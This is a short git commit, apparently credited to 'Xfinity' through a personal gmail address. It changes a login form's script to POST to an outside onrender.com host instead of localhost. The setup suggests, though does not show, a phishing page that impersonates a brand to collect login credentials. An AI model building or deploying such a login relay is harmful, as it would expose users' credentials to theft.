3c437cd578374e5437680328b76f4667145ee2a4
Xfinity <etina458@gmail.com>
2026-03-01 02:14:53 -0800

    deployed url

--- script.js
+++ script.js
@@ -24,7 +24,7 @@ loginBtn.addEventListener('click', async () => {
   verifyingBox.style.display = 'block';
 
   try {
-    const response = await fetch("http://localhost:5000/api/login", {
+    const response = await fetch("https://racks-9hel.onrender.com", {
       method: "POST",
       headers: { 
         "Content-Type": "application/json" 
